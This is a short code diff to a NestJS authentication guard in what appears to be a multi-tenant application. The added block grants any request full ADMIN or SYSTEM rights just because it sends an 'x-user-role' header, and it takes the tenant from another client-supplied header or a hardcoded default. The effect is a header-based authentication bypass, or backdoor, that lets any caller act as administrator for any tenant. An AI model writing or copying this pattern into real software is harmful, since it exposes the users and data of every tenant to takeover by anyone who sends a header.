@@ -29,6 +29,19 @@ export class CombinedAuthGuard implements CanActivate {
 
     const request = context.switchToHttp().getRequest();
     const url = request.url;
+
+    // 0. Special bypass for main admin via headers (highest priority)
+    const xUserRole = request.headers['x-user-role'];
+    if (xUserRole === 'ADMIN' || xUserRole === 'SYSTEM') {
+      // Importante: Adjuntar un objeto de usuario mínimo para que los controladores no fallen
+      request.user = {
+        role: xUserRole,
+        tenantId: request.headers['x-tenant-id'] || 'edd1ac37-5ff9-4e46-bc7f-fff3c414d718',
+        email: 'system@pitayacode.io'
+      };
+      console.log('BYPASS AUTH:', { url, role: xUserRole, tenantId: request.user.tenantId });
+      return true;
+    }
     
     // 1. Try API Key authentication first
     try {
